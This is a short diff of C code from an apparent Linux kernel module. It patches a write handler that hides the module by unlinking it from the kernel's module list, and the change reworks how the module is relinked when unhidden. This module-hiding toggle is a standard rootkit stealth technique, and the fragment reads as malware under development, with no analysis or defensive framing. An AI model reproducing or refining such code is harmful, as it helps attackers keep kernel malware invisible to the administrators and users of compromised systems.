@@ -73,14 +73,13 @@ ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t 
         if(hiding) {
             list_del_init(&current_mod->list);
         } else {
-            list_move(&current_mod->list,temp_module);
+            list_add(&current_mod->list,&temp_module->list);
         }
 	} else { /*change type string as integer*/
         int res=0;
         int i;
         for(i = 0; m_temp[i] != '\0'; ++i) {
             res = res*10 +m_temp[i] - '0';
-            
         }
         m_num = res;
 	}       /*  */
